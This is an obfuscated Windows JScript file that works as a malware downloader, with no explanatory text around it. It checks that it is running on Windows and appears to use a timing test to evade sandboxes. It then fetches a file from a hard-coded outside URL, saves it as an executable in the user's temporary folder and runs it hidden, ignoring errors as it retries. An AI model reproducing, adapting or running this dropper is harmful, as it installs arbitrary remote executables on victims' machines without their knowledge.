var _D = false;
var _R = "CreateObject";
var _CK = function _IS() {return WScript[_R]("WScript"+".Shell");}(), _FM = 11;
var _YD = "MSXML2.XMLHTTP";
var _HS = 2123213;
var _FJ = 0;
function _U(_FZ){_CK["Run"](_FZ, _FJ, _FJ);};
function _GR(){return _YD + "";};
function _Z(_U0, _G0){_FJ = _FJ * 1; return _U0 - _G0;};
function _UT(){return _R;};
/*@cc_on
  @if (@_win32 || @_win64)
    _D = true;
  @end
@*/
if (_D)
{
var _SN = "";
function _XK(){return 22;};
var _YV = 0; var _CL = 0;
function _KW()
{
var _M = new this["Date"]();
var _UA = _M["getUTCMilliseconds"]();
WScript["Sleep"](_XK());
var _M = new this["Date"]();
var _EB = _M["getUTCMilliseconds"]();
WScript["Sleep"](_XK());
var _M = new this["Date"]();
var _FC = _M["getUTCMilliseconds"]();
var _YV = "_PQ";
_YV = _Z(_EB, _UA);
var _CL = "_J0";
_CL = _Z(_FC, _EB);
_SN = "open";
return _Z(_YV, _CL);
}
var _Y = false;
var _K = false;
for (var _CH = _FJ; _CH < _XK() * 1; _CH++){if (_KW() != _FJ){
_Y = true; 
_CL = "31" + 11 * _YV + _CL; 
_K = true; 
break;
}}
function _YW() {return ((_Y == true) && (_Y == _K)) ? 1 : _FJ;};
if (_Y && _YW() && _K){
function _NR() {return _CK["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "6Fg1cj2XkApQUnu.ex" + "e";};
 _N = _GR();
 _YH = WScript[_R](_N);
 var _Q = 1;
 while (_Q){
try {
	if (_Q == 1)
	{
		_YH[_SN]("GET", "http://srijanexportstowelwarmers.co.uk/k9owpa", false);
		_YH["send"]();
		_G = "Sleep";
	}
	WScript[_G](_XK() + 120); 
	if (_YH["readystate"] < 2 * 2) continue;
	_Q = _FJ;
	function _T(_GJ) {var _CN = (1, 2, 3, 4, 5, _GJ); return _CN;};
	_SR = WScript[_UT()]("ADODB.Stream");
	_N = _SR;
	_N[_SN]();
	_N["type"] = _T(1);
	_N["write"](_YH["ResponseBody"]);
	_SR["position"] = _T(_FJ);
	_N["Save" + "ToFile"](_NR(), 2);
	_SR["cl"+"ose"]();
	_J = _NR();
	_U(_J);
} catch(_TZ){};
}
}
}

